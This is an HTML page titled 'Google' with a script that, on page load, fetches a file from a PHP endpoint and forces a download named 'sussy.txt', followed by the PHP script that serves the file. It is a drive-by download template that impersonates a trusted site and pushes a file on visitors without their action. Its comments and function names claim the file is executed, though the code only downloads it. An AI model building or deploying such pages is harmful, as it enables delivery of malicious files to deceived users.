<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google</title>
</head>
<body>
<script>
// Function to trigger download
function triggerDownloadAndExecute() {
    // Set the PHP script URL
    const phpScriptUrl = 'download_and_execute.php'; // Replace with the actual URL of your PHP script

    // Request the PHP script which serves the file content
    fetch(phpScriptUrl)
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.blob();
    })
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = 'sussy.txt'; // Change the filename if necessary
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
    })
    .catch(error => console.error('Error downloading and executing:', error));
}

// Trigger download and execution automatically when the page loads
window.onload = function() {
    triggerDownloadAndExecute();
};
</script>
</body>
</html>

<?php
// PHP code for download_and_execute.php
// Set the file path
$filePath = "C:\\xampp\\htdocs\\sussy.txt"; // Replace with the actual path to your file

// Check if the file exists
if (file_exists($filePath)) {
    // Set headers for inline display
    header('Content-Type: text/plain'); // Adjust Content-Type based on your file type
    header('Content-Disposition: inline; filename="' . basename($filePath) . '"');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath); // Read and output the file
    exit;
} else {
    // File not found error handling
    http_response_code(404);
    echo "File not found.";
    exit;
}
?>